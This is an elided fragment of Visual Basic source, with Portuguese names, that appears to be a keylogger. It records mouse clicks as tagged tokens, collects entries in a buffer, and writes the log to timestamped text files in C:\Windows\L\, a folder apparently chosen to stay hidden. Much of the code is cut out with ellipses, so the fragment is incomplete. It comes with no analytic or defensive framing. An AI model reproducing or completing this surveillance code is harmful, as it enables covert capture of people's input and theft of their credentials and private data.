...
Global Delay_SalvarLog As Long
...
Public Function AddLogger(Apertado As Integer)
    ...
    Select Case Apertado
        Case 1: Log = "#Click_Esquerdo#"
        Case 2: Log = "#Click_Direito#"
...
Public Function AddLog(Log As String, Tipo As Integer)
    ...
    Call TratarLog
    If Len(Logger) >= 10000 Then Call Salvar_Log
End Function

Public Function Salvar_Log()
    Dim ArquivoSaida As String
    ArquivoSaida = Replace((Now & ".txt"), "/", "-")
    ArquivoSaida = Replace(ArquivoSaida, ":", ".")
    ArquivoSaida = "C:\Windows\L\" & ArquivoSaida
